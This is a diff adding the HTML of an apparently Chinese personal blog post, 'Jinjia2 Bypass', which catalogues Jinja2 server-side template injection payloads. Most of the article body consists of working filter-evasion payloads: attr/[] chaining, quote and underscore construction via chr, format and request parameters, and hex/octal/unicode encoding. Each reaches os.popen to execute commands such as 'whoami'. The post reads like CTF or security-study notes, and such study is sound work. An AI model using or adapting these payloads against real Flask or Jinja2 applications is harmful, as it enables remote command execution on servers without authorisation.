@@ -1,0 +1,328 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8" />
+    <title>Jinjia2 Bypass | BAO.的个人博客</title>
+    <meta name="author" content="BAO." />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/BAO.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>BAO.的个人博客</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;BAO.的个人博客</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>Jinjia2 Bypass</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/5/28
+        </span>
+        
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="Jinjia2模板的部分绕过知识"><a href="#Jinjia2模板的部分绕过知识" class="headerlink" title="Jinjia2模板的部分绕过知识"></a>Jinjia2模板的部分绕过知识</h1><span id="more"></span>
+
+
+<h1 id="绕过"><a href="#绕过" class="headerlink" title=".绕过"></a>.绕过</h1><p>.绕过，可以使用attr方法或直接使用[]拼接获取到属性的基础类和各种方法，从而绕过.</p>
+<pre><code class="language-python">lipsum[&#39;__globals__&#39;][&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;)[&#39;popen&#39;](&#39;whoami&#39;)[&#39;read&#39;]() #使用[]绕过
+
+&#123;&#123;lipsum|attr('__globals__')|attr('get')('os')|attr('popen')('whoami')|attr('read')()&#125;&#125; #使用attr绕过
+
+&#123;&#123;lipsum|attr('__globals__')|attr('get')('__builtins__')|attr('get')('__import__')('os')|attr('popen')('whoami')|attr('read')()&#125;&#125;
+</code></pre>
+<h1 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h1><p>要绕过引号(包括单引号，双引号)大概有两种思路：  </p>
+<ol>
+<li>寻找不需要引号的SSTI注入语句，引号的作用主要是最后在命令执行如导入os和执行对应命令需要使用，还记得request变量，表示请求中的变量，可以直接使用它来代替一些命令。</li>
+</ol>
+<pre><code class="language-python">&#123;&#123;().__class__.__bases__[0].__subclasses__()[134].__init__.__globals__.__builtins__[request.args.a](request.args.b).popen(request.args.c).read()&#125;&#125;&amp;a=__import__&amp;b=os&amp;c=whoami  
+
+&#123;&#123;lipsum.__globals__.__builtins__.__import__(request.args.a)[request.args.b](request.args.c).read()&#125;&#125;&amp;a=os&amp;b=popen&amp;c=whoami&amp;d=read
+
+#以下的request变量的参数都是可以使用的
+#request.args.name
+#request.values.name
+#request.cookies.name
+#request.headers.name
+#request.form.name
+</code></pre>
+<p>通过一些方法制造出引号这个字符，比如chr()这个函数，通过list将类名分割得到引号，制造%通过urldecode制造任意字符等，其实引号能造出的方式挺多的，比如以下： </p>
+<pre><code class="language-python">&#123;%set chr=g|lower|list|batch(13)|list|first|last%&#125;&#123;&#123;chr&#125;&#125;#直接造出&#39;
+
+&#123;% set chr=lipsum|lower|list|first|urlencode|first %&#125; #造出%
+&#123;%set c=dict(c=0).keys()|reverse|first%&#125;  #造出c
+&#123;%set url=dict(a=chr,c=c).values()|join %&#125; #造出%c
+&#123;%set url2=url|format(39)%&#125;&#123;&#123;url2&#125;&#125; #通过%c|format的形式即可造出任意字符
+#通过造chr函数
+&#123;%set chr=().__class__.__bases__[0].__subclasses__()[80].__init__.__globals__.__builtins__.chr%&#125;
+&#123;%set chr=().__class__.__bases__[0].__subclasses__()[80].__init__.__globals__.__builtins__.chr%&#125;&#123;&#123;lipsum.__globals__.__builtins__.__import__(chr(111)~chr(115))[chr(112)~chr(111)~chr(112)~chr(101)~chr(110)](chr(119)~chr(104)~chr(111)~chr(97)~chr(109)~chr(105)).read()&#125;&#125;  #通过chr造字符
+
+
+&#123;% set chr=lipsum|lower|list|first|urlencode|first %&#125; &#123;%set c=dict(c=0).keys()|reverse|first%&#125;&#123;%set url=dict(a=chr,c=c).values()|join %&#125;&#123;%set url2=url|format(39)%&#125;&#123;%set o=url|format(111)%&#125;  &#123;%set s=url|format(115)%&#125; &#123;%set p=url|format(112)%&#125; &#123;%set e=url|format(101)%&#125; &#123;%set n=url|format(110)%&#125; &#123;%set w=url|format(119)%&#125; &#123;%set h=url|format(104)%&#125; &#123;%set a=url|format(97)%&#125; &#123;%set m=url|format(109)%&#125; &#123;%set i=url|format(105)%&#125;
+&#123;%set os=o~s|string%&#125;&#123;%set popen=p~o~p~e~n|string%&#125;&#123;% set whoami=w~h~o~a~m~i %&#125;
+&#123;%print(lipsum.__globals__.__builtins__.__import__(os)[popen](whoami).read())%&#125;  #通过%c的形式造任何字符，注意这里根本不需要造引号，因为flask在处理的时候会自动加上引号当成字符处理。
+</code></pre>
+<h1 id="绕过-1"><a href="#绕过-1" class="headerlink" title="_绕过"></a>_绕过</h1><p><em>绕过的思路大同小异，一种是通过编码绕过，一种是造出</em>，毕竟前面我们已经能造出任何字符了，当然也可以通过其它形式来造出_ ，因为下划线相对于引号还是出现的比较频繁的，还有一种也是request的形式，通过request得到_</p>
+<ol>
+<li>编码绕过</li>
+</ol>
+<pre><code class="language-python"># 转十六进制
+def tohex(string):
+    for i in string:
+        print(&quot;\\x&#123;:0x&#125;&quot;.format(ord(i)), end=&quot;&quot;)
+    print()
+
+
+# 转八进制
+def tooct(string):
+    for i in string:
+        print(&quot;\\&#123;:0o&#125;&quot;.format(ord(i)), end=&quot;&quot;)
+    print()
+
+
+# 转unicode
+def touni(string):
+    for i in string:
+        print(&quot;\\u00&#123;:0x&#125;&quot;.format(ord(i)), end=&quot;&quot;)
+    print()
+
+
+string1 = &quot;&quot; #要编码的字符串
+tohex(string1)
+tooct(string1)
+touni(string1)
+&#123;&#123;""["\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"]["\x5f\x5f\x62\x61\x73\x65\x73\x5f\x5f"][0]["\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f"]()[134]["\x5f\x5f\x69\x6e\x69\x74\x5f\x5f"]["\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f"]['popen']('whoami').read()&#125;&#125; #十六进制
+
+&#123;&#123;""["\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f"]["\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f"]["\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f"]()[134]["\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f"]["\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f"]['popen']('whoami').read()&#125;&#125; #unicode编码
+
+&#123;&#123;""["\137\137\143\154\141\163\163\137\137"]["\137\137\142\141\163\145\137\137"]["\137\137\163\165\142\143\154\141\163\163\145\163\137\137"]()[134]["\137\137\151\156\151\164\137\137"]["\137\137\147\154\157\142\141\154\163\137\137"]['popen']('whoami').read()&#125;&#125; #八进制
+</code></pre>
+<p>request绕过  </p>
+<pre><code class="language-python">&#123;&#123;""[request.args.a][request.args.b][request.args.c]()[134][request.args.d][request.args.e]['popen']('whoami').read()&#125;&#125;&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__init__&amp;e=__globals__
+</code></pre>
+<p> 构造_进行绕过  </p>
+<pre><code class="language-python">&#123;% set chr=lipsum|lower|list|first|urlencode|first %&#125; &#123;%set c=dict(c=0).keys()|reverse|first%&#125;&#123;%set url=dict(a=chr,c=c).values()|join %&#125;&#123;%set url2=url|format(95)%&#125;&#123;%set class=url2*2~'class'~url2*2%&#125;
+&#123;%set base=url2*2~'base'~url2*2%&#125;&#123;%set sub=url2*2~'subclasses'~url2*2%&#125;&#123;%set init=url2*2~'init'~url2*2%&#125;&#123;%set glo=url2*2~'globals'~url2*2%&#125;&#123;&#123;""[class][base][sub]()[134][init][glo]['popen']('whoami').read()&#125;&#125;
+
+
+&#123;% set chr=lipsum|string|list|batch(19)|list|first|last%&#125;&#123;%set class=[chr*2,'class',chr*2]|join%&#125;&#123;%set sub=[chr*2,'subclasses',chr*2]|join%&#125;&#123;%set base=[chr*2,'base',chr*2]|join%&#125;&#123;%set init=[chr*2,'init',chr*2]|join%&#125;&#123;%set glo=[chr*2,'globals',chr*2]|join%&#125;
+&#123;&#123;""[class][base][sub]()[134][init][glo]['popen']('whoami').read()&#125;&#125;
+init过滤
+__init__是用于初始化的方法，可以使用其它方法代替，如__enter__，__exit__
+```python
+&#123;&#123;"".__class__.__base__.__subclasses__()[134].__enter__.__globals__['popen']('whoami').read()&#125;&#125;
+&#123;&#123;"".__class__.__base__.__subclasses__()[134].__exit__.__globals__['popen']('whoami').read()&#125;&#125;
+</code></pre>
+<p>[ ]被过滤<br> 因为[]并不是必须的，因为过滤了[]可以往不用[]那边想，因为.__的形式就不需要使用[]，如以下：  </p>
+<pre><code class="language-python">&#123;&#123;().__class__.__base__.__subclasses__().pop(134).__init__.__globals__.popen('whoami').read()&#125;&#125; #通过pop来选择类
+
+&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(134).__init__.__globals__.popen('whoami').read()&#125;&#125; #通过getitem选择类
+ 
+&#123;&#123;lipsum|attr('__globals__')|attr('get')('__builtins__')|attr('get')('__import__')('os')|attr('popen')('whoami')|attr('read')()&#125;&#125; #通过attr来绕过
+
+</code></pre>
+<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol>
+<li>环境差异：子类索引号会随Python版本变化</li>
+<li>输出处理：popen返回对象需使用<code>.read()</code>读取</li>
+<li>上下文限制：部分对象在不同模板引擎中可用性不同</li>
+<li>过滤绕过：可组合使用多种技术实现多层绕过</li>
+</ol>
+<pre><code>
+</code></pre>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2025 BAO.的个人博客
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;BAO.
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
